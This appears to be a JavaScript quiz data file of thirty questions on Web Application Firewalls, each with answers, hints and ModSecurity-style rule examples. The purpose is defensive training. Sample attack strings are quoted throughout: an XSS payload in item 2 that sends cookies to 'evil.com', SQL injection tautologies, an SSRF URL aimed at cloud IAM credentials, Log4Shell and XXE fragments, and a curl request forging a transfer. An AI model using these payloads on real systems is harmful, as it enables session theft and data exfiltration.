const questions = [
  {
    id: 1,
    question: "What is the primary difference between a Network Firewall (L3/L4/NGFW) and a Web Application Firewall (WAF - L7)?",
    shortAnswer: "A Network Firewall inspects IP addresses, TCP ports, and network routes (Layer 3/4); a WAF terminates and deeply inspects HTTP/HTTPS application logic, URIs, parameters, headers, and JSON/XML payloads (Layer 7).",
    explanation: "To a network firewall, an SQL injection attack `GET /users?id=1%20OR%201=1` appears as a completely legitimate TCP handshake on permitted port 443. Only a WAF decodes the HTTP parameter, understands SQL semantics, and blocks the application exploit.",
    hint: "Network firewalls check IP/ports; WAFs check HTTP web payloads and code injections.",
    level: "Basic",
    codeExample: `// Network Firewall vs WAF Comparison:
// Network Firewall Check: "Is Port 443 permitted from IP 203.0.113.10?" → YES (Passes exploit!)
// WAF Layer 7 Check      : "Does the parameter contain 'UNION SELECT'?"  → YES → ACTION: HTTP 403 FORBIDDEN!`
  },
  {
    id: 2,
    question: "Why can a standard stateful network firewall NOT prevent SQL Injection (SQLi) or Cross-Site Scripting (XSS)?",
    shortAnswer: "Because SQLi and XSS payloads are encapsulated inside valid HTTP requests traversing open web ports (80 or 443); network firewalls do not parse HTTP grammar or application variables.",
    explanation: "Stateful network firewalls focus on packet headers and TCP flags. Because web servers must have port 443 open to the public, any web attack sent over port 443 satisfies all network firewall rules and is forwarded directly to the vulnerable application.",
    hint: "Web attacks ride on legitimate open web ports like 443 that network firewalls leave open.",
    level: "Basic",
    codeExample: `// Web Exploit on Open Port:
// TCP Packet: SYN → SYN-ACK → ACK → Valid TLS 1.3 Session on Port 443
// Payload: <script>document.location='http://evil.com?c='+document.cookie</script>`
  },
  {
    id: 3,
    question: "What is 'Collaborative Anomaly Scoring' in ModSecurity and the OWASP Core Rule Set (CRS)?",
    shortAnswer: "A scoring engine where matching rules do not block immediately; instead, each matched pattern adds an anomaly score (Critical=5, Error=4, Warning=3) to the request; if the cumulative score exceeds the threshold (e.g. 5), the request is blocked.",
    explanation: "Legacy single-rule blocking caused frequent false positives when legitimate user input matched a strict keyword. Collaborative Anomaly Scoring evaluates the request holistically, requiring multiple suspicious indicators or a single severe critical indicator before blocking.",
    hint: "Adding up points for every suspicious pattern and blocking only if the total score exceeds the limit.",
    level: "Moderate",
    codeExample: `// OWASP CRS Collaborative Anomaly Scoring:
// Rule 942100 (SQLi Keyword)     → Score +5
// Rule 920100 (Missing User-Agent)-> Score +3
// Total Score: 8 >= Threshold 5 → Action: HTTP 403 Forbidden!`
  },
  {
    id: 4,
    question: "What are 'Paranoia Levels' (PL 1 through PL 4) in the OWASP Core Rule Set (CRS)?",
    shortAnswer: "Tuning tiers that balance security posture against false positives: PL 1 provides baseline protection with zero false positives, while PL 4 enforces ultra-strict keyword and character whitelist constraints for high-security banking/defense portals.",
    explanation: "Standard public websites run at PL 1 or PL 2. High-value API endpoints (such as interbank payment gateways) run at PL 3 or PL 4, where even minor deviations in character sets (e.g. non-ASCII bytes in headers) result in immediate rejection.",
    hint: "Security sensitivity levels ranging from baseline (PL 1) to ultra-strict military grade (PL 4).",
    level: "Moderate",
    codeExample: `// OWASP CRS Paranoia Level Settings:
// secrule TX:executing_paranoia_level "@eq 1" (Standard Enterprise)
// secrule TX:executing_paranoia_level "@eq 3" (Banking / Financial Core)`
  },
  {
    id: 5,
    question: "What is 'Positive Security Model' (Schema / Whitelist Validation) vs 'Negative Security Model' (Signature Blacklisting) in WAF design?",
    shortAnswer: "A Negative Model blocks known attack signatures (regex matching `' UNION SELECT`); a Positive Model enforces a strict schema defining permitted data types, lengths, and regex patterns (e.g. `age` must be an integer between 1 and 120), rejecting anything else.",
    explanation: "Negative models can be bypassed by novel obfuscation techniques. A Positive Security Model provides mathematical certainty: if an API endpoint expects `{'account_id': 100452}`, submitting any string containing letters or quotes is instantly rejected by schema validation.",
    hint: "Negative model blocks known bad patterns; Positive model allows only pre-approved exact formats.",
    level: "Moderate",
    codeExample: `// OpenAPI / Positive WAF Schema:
// "account_id": { "type": "integer", "minimum": 100000, "maximum": 999999 }
// Input: "100452' OR 1=1--" → REJECTED: Failed integer schema validation!`
  },
  {
    id: 6,
    question: "How does 'Libinjection' analyze SQL Injection (SQLi) and XSS differently from standard regular expressions?",
    shortAnswer: "Libinjection uses a lexical tokenizer that parses input as a real SQL/HTML grammatical syntax tree (identifying tokens like literals, operators, and keywords) rather than looking for static text patterns, achieving near-zero false positives.",
    explanation: "Attackers bypass regex filters by using whitespace variations, comments (`/*...*/`), and SQL function encoding. Libinjection strips comments and tokenizes the grammar; if the token stream forms a valid executable SQL expression, it flags it as an injection attack.",
    hint: "Parses input like a real SQL compiler to understand the actual meaning of the code.",
    level: "Expert",
    codeExample: `// Libinjection Tokenization:
// Input: "1' or 1=1--" → Tokens: [1] (Literal), ['] (Quote), [or] (Logic Operator), [1=1] (Tautology)
// Verdict: SQLi Syntax Tree Confirmed!`
  },
  {
    id: 7,
    question: "What is a 'Cloud-Based Reverse Proxy WAF' (e.g. Cloudflare, AWS WAF, Akamai) and what are its key architectural advantages?",
    shortAnswer: "Traffic is routed to cloud scrubbing centers via DNS CNAME/Anycast routing where TLS is terminated and inspected before clean requests are forwarded to origin servers; provides global Anycast DDoS mitigation and zero hardware footprint.",
    explanation: "Cloud WAFs absorb volumetric multi-terabit DDoS attacks globally before they can saturate the enterprise datacenter's physical Internet uplink, while automatically updating threat intelligence rules based on attacks observed worldwide.",
    hint: "A cloud-hosted firewall that scrubs malicious traffic globally before it reaches your server.",
    level: "Basic",
    codeExample: `// Cloud WAF Architecture Flow:
// User Browser ---> [Cloudflare / AWS WAF (DDoS Scrub + OWASP Inspection)] ---> [Clean Traffic to Origin Server]`
  },
  {
    id: 8,
    question: "What is an 'Embedded / Host-Based WAF' (e.g. NGINX ModSecurity / Coraza Go-WAF)?",
    shortAnswer: "A software module running directly inside the web server daemon process (NGINX, Envoy, Apache) that inspects HTTP requests in memory without introducing additional network hops or external appliances.",
    explanation: "Embedded WAFs operate with minimal microsecond latency and have full access to decrypted HTTP memory structures without requiring external TLS termination appliances, making them ideal for microservices and Kubernetes sidecars.",
    hint: "A WAF plugin running directly inside the web server software.",
    level: "Moderate",
    codeExample: `// NGINX ModSecurity Configuration:
// load_module modules/ngx_http_modsecurity_module.so;
// modsecurity on;
// modsecurity_rules_file /etc/nginx/modsec/main.conf;`
  },
  {
    id: 9,
    question: "How does a WAF mitigate 'Credential Stuffing and Brute-Force Bot Attacks'?",
    shortAnswer: "By implementing client-side JavaScript challenge puzzles, CAPTCHA challenges, behavioral biometric fingerprinting, and IP velocity rate-limiting on login and authentication endpoints.",
    explanation: "When an automated botnet attempts to test thousands of stolen username/password pairs against `/api/v1/login`, the WAF detects high request velocity from distributed IPs, injects invisible JavaScript proof-of-work puzzles that headless browsers cannot solve, and blocks the bot swarm.",
    hint: "Using JavaScript puzzles, CAPTCHAs, and rate limits to block automated login botnets.",
    level: "Moderate",
    codeExample: `// WAF Rate-Limiting Rule:
// IF URI == '/api/v1/login' AND RequestsPerMinute(ClientIP) > 5:
//     Action: CHALLENGE (Serve JS Proof-of-Work Puzzle)`
  },
  {
    id: 10,
    question: "What is 'Server-Side Request Forgery' (SSRF) and how does a WAF detect and neutralize it?",
    shortAnswer: "SSRF occurs when an attacker tricks a web server into making HTTP requests to internal resources; a WAF inspects submitted URL parameters and blocks requests pointing to cloud metadata IPs (`169.254.169.254`) or RFC 1918 private subnets.",
    explanation: "In cloud environments, attackers submit parameters like `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials` to steal AWS IAM role tokens. The WAF validates the schema, dropping any URL pointing to loopback, link-local, or private IP ranges.",
    hint: "Blocking web requests targeting cloud metadata (169.254.169.254) or private internal IPs.",
    level: "Moderate",
    codeExample: `// WAF SSRF Detection Rule:
// SecRule ARGS "@rx ^https?://(169\.254\.169\.254|127\.0\.0\.1|localhost|10\.)" "id:934100,deny,status:403"`
  },
  {
    id: 11,
    question: "What is 'Virtual Patching' in WAF operations and why is it critical during Zero-Day disclosures?",
    shortAnswer: "Deploying a WAF inspection rule that intercepts and blocks an exploit payload targeting a newly discovered vulnerability before developers can modify, test, and deploy patched application source code.",
    explanation: "When critical vulnerabilities like Log4Shell (CVE-2021-44228) or Spring4Shell are disclosed, rewriting and redeploying thousands of enterprise microservices can take weeks. A WAF virtual patch blocking the exploit string (`${jndi:`) protects the entire fleet within 5 minutes.",
    hint: "Blocking a new zero-day exploit at the firewall immediately while waiting for developers to fix the code.",
    level: "Basic",
    codeExample: `// Virtual Patch for Log4Shell:
// SecRule REQUEST_HEADERS|REQUEST_BODY "@rx \$\{jndi:(ldap|rmi|dns):" "id:100001,phase:2,deny,status:403"`
  },
  {
    id: 12,
    question: "How does a WAF prevent 'Data Leakage / Credit Card Number Scrubbing' on outbound HTTP responses?",
    shortAnswer: "By inspecting HTTP response bodies for sensitive data patterns (e.g. 16-digit credit card Luhn numbers, Aadhaar numbers, database stack traces) and masking or blocking the response before it reaches the client.",
    explanation: "If a database error dumps customer credit card numbers or stack traces into a web page, the WAF's outbound inspection engine detects the pattern, redacts the digits (`4111-XXXX-XXXX-1111`), and prevents catastrophic data exposure.",
    hint: "Scanning outgoing web responses to mask credit cards, Aadhaar numbers, and database errors.",
    level: "Moderate",
    codeExample: `// Outbound Credit Card Masking Rule:
// SecRule RESPONSE_BODY "@rx \b(?:\d{4}[ -]?){3}\d{4}\b" "id:950100,phase:4,sanitizeMatchedBytes"`
  },
  {
    id: 13,
    question: "What is 'API Security & JSON/XML Body Inspection' in modern Next-Gen WAFs (WAAP)?",
    shortAnswer: "Deep parsing and validation of REST, GraphQL, and SOAP API payloads, verifying JSON schemas, blocking nested XML bomb attacks (Billion Laughs), and enforcing JWT authentication signature verification.",
    explanation: "Modern web applications use API backends transmitting JSON rather than HTML form data. Modern WAFs (Web Application & API Protection - WAAP) parse JSON objects, validate types and nested depths, and block API-specific exploits like Broken Object Level Authorization (BOLA).",
    hint: "Parsing and validating JSON and GraphQL API requests for mobile and web apps.",
    level: "Expert",
    codeExample: `// JSON Parser Directive:
// SecRule REQUEST_HEADERS:Content-Type "@rx ^application/json" "id:200001,phase:1,t:none,ctl:requestBodyProcessor=JSON"`
  },
  {
    id: 14,
    question: "What is 'Cookie Poisoning / Session Tampering' and how does a WAF defend against it?",
    shortAnswer: "Attackers modifying session cookies (e.g. changing `user_role=user` to `user_role=admin`); WAFs defeat this by cryptographically signing and encrypting all server-issued cookies at the reverse proxy layer.",
    explanation: "When the origin web server issues a `Set-Cookie` header, the WAF appends an HMAC cryptographic signature. When the client returns the cookie, the WAF validates the signature; if the client altered any cookie values, the WAF rejects the request.",
    hint: "Cryptographically signing cookies so users cannot alter their permissions in the browser.",
    level: "Moderate",
    codeExample: `// WAF Cookie Encryption & Signing:
// Set-Cookie: session_id=9821.HMAC_SIG_a89f31b → Tampered cookie rejected by WAF with HTTP 403!`
  },
  {
    id: 15,
    question: "What is 'HTTP Request Smuggling / Desync Attack' and how does a WAF prevent it?",
    shortAnswer: "Exploiting discrepancies in how frontend reverse proxies and backend web servers interpret ambiguous `Content-Length` and `Transfer-Encoding: chunked` headers; WAFs normalize headers and reject ambiguous requests.",
    explanation: "In HTTP request smuggling, an attacker crafts dual headers (`Transfer-Encoding` + `Content-Length`) to smuggle a hidden second request past the frontend proxy into the backend server. A WAF strictly enforces RFC 7230, dropping requests with conflicting framing headers.",
    hint: "Blocking ambiguous requests with dual Content-Length and Transfer-Encoding headers.",
    level: "Expert",
    codeExample: `// HTTP Smuggling Prevention Rule:
// SecRule &REQUEST_HEADERS:Transfer-Encoding "@gt 0" "chain,id:920170,deny,status:400"
//   SecRule &REQUEST_HEADERS:Content-Length "@gt 0"`
  },
  {
    id: 16,
    question: "What is 'TLS Fingerprinting' (JA3 / JA4) in WAF bot detection engines?",
    shortAnswer: "Creating a cryptographic hash of the client's initial TLS Client Hello packet (ciphers, extensions, elliptic curves), allowing the WAF to identify malicious Python scripts or bot tools even if they spoof standard browser User-Agent headers.",
    explanation: "A malicious scraper script written in Python can easily send a fake User-Agent header claiming to be `Chrome 120`. However, its TLS Client Hello fingerprint (JA3 hash) matches Python `requests`, allowing the WAF to detect and block the bot instantly.",
    hint: "Identifying bot scripts by their unique SSL handshake fingerprint even if they fake their User-Agent.",
    level: "Expert",
    codeExample: `// JA3 Fingerprint Matching:
// Client JA3: "e7d705a3286e19ea42f587b344ee6865" (Matches Python Requests Library)
// Action: CHALLENGE / DROP (Bot spoofing Chrome header detected!)`
  },
  {
    id: 17,
    question: "Why should an enterprise NEVER rely solely on client-side (JavaScript) validation for web application security?",
    shortAnswer: "Client-side validation can be completely bypassed by attackers using tools like Burp Suite, Postman, or cURL to send raw malicious HTTP payloads directly to the server; validation must occur at the WAF and backend server.",
    explanation: "Client-side JavaScript only runs in cooperative browsers. An attacker disables JavaScript or uses command-line tools to transmit raw SQL injection strings directly over HTTP, making server-side and WAF inspection mandatory.",
    hint: "Hackers bypass browser checks using cURL or Burp Suite; validation must happen on the server/WAF.",
    level: "Basic",
    codeExample: `// Bypassing Client Validation:
// curl -X POST https://bank.gov.in/transfer -d "amount=-50000&to_account=attacker"`
  },
  {
    id: 18,
    question: "What is 'Learning Mode / Passive Simulation Mode' during initial WAF deployment?",
    shortAnswer: "Configuring the WAF to log and score potential threats without actually blocking requests, allowing security engineers to analyze logs and tune rules to eliminate false positives before turning on active blocking.",
    explanation: "Deploying a WAF in immediate blocking mode can inadvertently break legitimate business workflows (e.g. blocking a medical form containing legitimate clinical terms). Running in Detection/Learning mode for 14–30 days allows fine-tuning before enforcement.",
    hint: "Running the WAF in monitor-only mode for 2 weeks to fix false alarms before turning on active blocking.",
    level: "Basic",
    codeExample: `// ModSecurity Learning Mode:
// SecRuleEngine DetectionOnly (Logs anomalies without blocking)
// SecRuleEngine On            (Active blocking enabled)`
  },
  {
    id: 19,
    question: "What is 'XML External Entity' (XXE) Injection and how does a WAF protect SOAP and XML endpoints?",
    shortAnswer: "An attack where malicious XML documents define external entities (`<!ENTITY xxe SYSTEM 'file:///etc/passwd'>`) to read server files; a WAF disables DTD parsing and blocks `<!DOCTYPE` and `<!ENTITY` definitions in request bodies.",
    explanation: "Vulnerable XML parsers resolve external file entities, allowing attackers to exfiltrate `/etc/shadow` or pivot to internal network services. The WAF inspects XML payloads and rejects any request containing DTD entity definitions.",
    hint: "Blocking malicious XML files that attempt to read server files or internal systems.",
    level: "Moderate",
    codeExample: `// XXE Block Rule:
// SecRule REQUEST_BODY "@rx <!DOCTYPE[^>]+SYSTEM" "id:933100,deny,status:403"`
  },
  {
    id: 20,
    question: "How does a WAF prevent 'Cross-Site Request Forgery' (CSRF) in legacy web applications?",
    shortAnswer: "By validating the `Origin` and `Referer` headers, and automatically injecting and verifying cryptographically secure anti-CSRF synchronization tokens into HTML forms and AJAX headers.",
    explanation: "CSRF tricks an authenticated user's browser into submitting unauthorized transactions. The WAF checks that the `Referer` matches the legitimate domain and verifies the presence of a valid CSRF token, dropping cross-origin forge attempts.",
    hint: "Checking Referer headers and verifying anti-CSRF tokens to prevent forged transactions.",
    level: "Moderate",
    codeExample: `// CSRF Header Validation:
// SecRule REQUEST_HEADERS:Referer "!@beginsWith https://bank.gov.in/" "id:981001,deny,status:403"`
  },
  {
    id: 21,
    question: "What is 'Path Traversal / Directory Climbing' (`../..`) and how does a WAF detect encoded traversal attempts?",
    shortAnswer: "Attackers using dot-dot-slash sequences to escape web root directories and access operating system files; WAFs normalize multiple encoding layers (URL decoding, Unicode normalization) before evaluating traversal signatures.",
    explanation: "Attackers try obfuscating traversal using double-URL encoding (`%252e%252e%252f`) or overlong UTF-8 bytes. The WAF applies recursive decoding transformation functions (`t:urlDecodeUni,t:normalizePath`) to resolve the canonical path and block access to `/etc/passwd`.",
    hint: "Decoding obfuscated ../.. sequences to stop hackers from accessing operating system files.",
    level: "Moderate",
    codeExample: `// Path Traversal Transformation & Rule:
// SecRule REQUEST_URI "@rx (?:/etc/passwd|/windows/win\.ini|\.\./\.\.)" "id:930100,t:urlDecodeUni,t:normalizePath,deny"`
  },
  {
    id: 22,
    question: "What is 'WebSockets Inspection' in modern Cloud Web Application Firewalls?",
    shortAnswer: "Monitoring persistent full-duplex WebSocket connections (`ws://` and `wss://`) for Layer 7 injection attacks, rate-limiting frame velocity, and validating message payload schemas in real-time.",
    explanation: "Modern real-time applications (chat, trading platforms) upgrade HTTP connections to WebSockets. Advanced WAFs inspect individual WebSocket text frames for SQLi and XSS payloads, ensuring persistent channels remain secure.",
    hint: "Inspecting persistent two-way chat and trading connections for malicious commands.",
    level: "Expert",
    codeExample: `// WebSocket Inspection Pipeline:
// HTTP 101 Switching Protocols ---> [WAF WebSocket Frame Inspector (Scans JSON Payloads)] ---> Origin Backend`
  },
  {
    id: 23,
    question: "How does a WAF protect against 'Zero-Day Remote Code Execution' (e.g. Spring4Shell, Apache Struts) via Content-Type header validation?",
    shortAnswer: "By strictly whitelisting permitted `Content-Type` headers (e.g. `application/json`, `text/html`) and dropping requests with malformed, oversized, or executable Content-Type strings used in classloader exploits.",
    explanation: "Exploits like Apache Struts (CVE-2017-5638) weaponized OGNL expressions injected inside the `Content-Type` header. A WAF enforcing strict header format checks drops the malformed header before it can trigger vulnerable parser code.",
    hint: "Blocking weird or oversized Content-Type headers used in classloader exploits.",
    level: "Expert",
    codeExample: `// Content-Type Whitelist Rule:
// SecRule REQUEST_HEADERS:Content-Type "!@rx ^(application/json|application/x-www-form-urlencoded|multipart/form-data)" "id:920420,deny"`
  },
  {
    id: 24,
    question: "What is 'GraphQL Introspection & Query Depth Limiting' in API WAF security?",
    shortAnswer: "Disabling public GraphQL schema introspection in production and enforcing strict limits on nested query depths (e.g. max 5 levels) to prevent Denial-of-Service and unauthorized database schema enumeration.",
    explanation: "Attackers submit deeply recursive GraphQL queries (`author { books { author { books ... } } }`) to exhaust backend database CPU resources. A WAAP parses the AST, calculates the query depth, and rejects oversized queries.",
    hint: "Limiting how deeply nested a GraphQL database query can be to prevent server crashes.",
    level: "Expert",
    codeExample: `// GraphQL Query Depth Rule:
// IF GraphQL.QueryDepth > 5:
//     Action: REJECT (Prevents recursive query DoS attack)`
  },
  {
    id: 25,
    question: "What is the CERT-In compliance requirement regarding Web Application Firewall security incident logging?",
    shortAnswer: "All WAF blocked events, client IP addresses, User-Agents, request URIs, payload snippets, and NPL India NTP timestamps must be retained in immutable SIEM archives for 180 days.",
    explanation: "Under CERT-In directions, organizations must maintain audit trails of web attack attempts for forensic reconstruction and correlation across national cybersecurity incidents.",
    hint: "180-day retention of all WAF attack logs synchronized with NPL India NTP.",
    level: "Basic",
    codeExample: `// Structured WAF Audit Log:
const wafLogEntry = {
  timestamp: "2026-08-23T11:15:30.120Z",
  clientIp: "203.0.113.88",
  method: "POST",
  uri: "/api/v1/checkout",
  ruleId: "942100",
  anomalyScore: 5,
  attackType: "SQL_INJECTION",
  action: "BLOCKED_403"
};`
  },
  {
    id: 26,
    question: "What is 'Open Redirect / SSRF Chaining' and how does a WAF mitigate malicious URL redirections?",
    shortAnswer: "Attackers exploiting parameters like `?redirect=http://evil.com` to phish users or bypass SSRF protections; WAFs validate that redirect destination URLs match a strict whitelist of internal domains.",
    explanation: "Open redirects allow attackers to craft phishing links on trusted government or banking domains (`https://bank.gov.in/login?next=http://phish.com`). The WAF rejects any redirect target that is not a relative path or an approved corporate subdomain.",
    hint: "Blocking redirect parameters pointing to unapproved external websites.",
    level: "Basic",
    codeExample: `// Open Redirect Protection:
// SecRule ARGS:redirect "!@rx ^(/[a-zA-Z0-9_-]+|https://bank\.gov\.in/)" "id:981100,deny,status:403"`
  },
  {
    id: 27,
    question: "How do modern WAFs handle 'Decrypted TLS Inspection' without slowing down multi-gigabit web traffic?",
    shortAnswer: "Using hardware-accelerated TLS termination (crypto ASICs/FPGAs) or HTTP/2 & HTTP/3 connection multiplexing engines to offload SSL handshakes from software inspection cores.",
    explanation: "Terminating thousands of concurrent TLS 1.3 handshakes consumes significant CPU power. Dedicated hardware crypto coprocessors decrypt the stream in silicon, presenting clean plaintext streams to the WAF inspection pipeline at line rate.",
    hint: "Specialized crypto chips decrypt SSL traffic in hardware at high speed.",
    level: "Moderate",
    codeExample: `// TLS Hardware Acceleration Pipeline:
// Ingress (TLS 1.3) ---> [Crypto ASIC Decryption] ---> [High-Speed L7 WAF Parsing] ---> Backend Origin`
  },
  {
    id: 28,
    question: "What is 'Parameter Pollution' (HTTP Parameter Pollution - HPP) and how does a WAF prevent it?",
    shortAnswer: "Supplying duplicate parameter keys (e.g. `?id=1&id=2`) to confuse frontend and backend parsers; WAFs detect duplicate parameter keys and reject ambiguous requests.",
    explanation: "If the WAF inspects only the first parameter `id=1` (benign), but the backend server processes the second parameter `id=2' OR 1=1--` (malicious), the attack succeeds. WAF HPP rules reject requests containing duplicate parameter keys.",
    hint: "Blocking requests with duplicate parameter names used to confuse security filters.",
    level: "Moderate",
    codeExample: `// HTTP Parameter Pollution Block:
// SecRule &ARGS:id "@gt 1" "id:921170,deny,status:400,msg:'HPP Duplicate Parameter Detected'"`
  },
  {
    id: 29,
    question: "Why should an enterprise deploy BOTH a Next-Generation Network Firewall AND a Web Application Firewall?",
    shortAnswer: "Defense-in-Depth: Network firewalls protect the infrastructure, routing, IP boundaries, and non-web protocols; WAFs protect web applications and APIs from OWASP Top 10 code injection vulnerabilities.",
    explanation: "A Network Firewall without a WAF leaves web applications exposed to SQLi and XSS; a WAF without a Network Firewall leaves perimeter infrastructure exposed to DDoS, IP spoofing, and port scanning. Together, they provide complete Layer 3 to Layer 7 protection.",
    hint: "Network firewalls protect network ports and routing; WAFs protect web code and databases.",
    level: "Basic",
    codeExample: `// Complete Perimeter Defense Architecture:
// [Internet] ---> [NGFW (L3/L4 Flood & Port Defense)] ---> [WAF (L7 SQLi/XSS/Bot Defense)] ---> [Web & DB Servers]`
  },
  {
    id: 30,
    question: "Synthesize the overarching role of Web Application Firewalls (WAF) in modern enterprise perimeter defense.",
    shortAnswer: "WAFs are the indispensable Layer 7 guardians of the web and API era, terminating HTTPS to deeply parse application grammar, mitigate OWASP Top 10 vulnerabilities, neutralize botnets, and provide virtual patching at cloud and on-premise perimeters.",
    explanation: "As enterprise workloads migrate to web apps, microservices, and public APIs, traditional port-based defense is insufficient. WAFs provide granular, semantic application inspection to protect sensitive customer data and maintain compliance in full alignment with the DPDP Act 2023.",
    hint: "The essential Layer 7 guardian that protects web apps, APIs, and databases from code exploits.",
    level: "Moderate",
    codeExample: `// The Master WAF Security Formula:
// Resilient Web Defense = [OWASP CRS Anomaly Scoring] + [Libinjection Grammar Parsing] + [Bot Mitigation] + [Positive Schema Validation] + [180-Day WORM Logs]`
  }
];

export default questions;
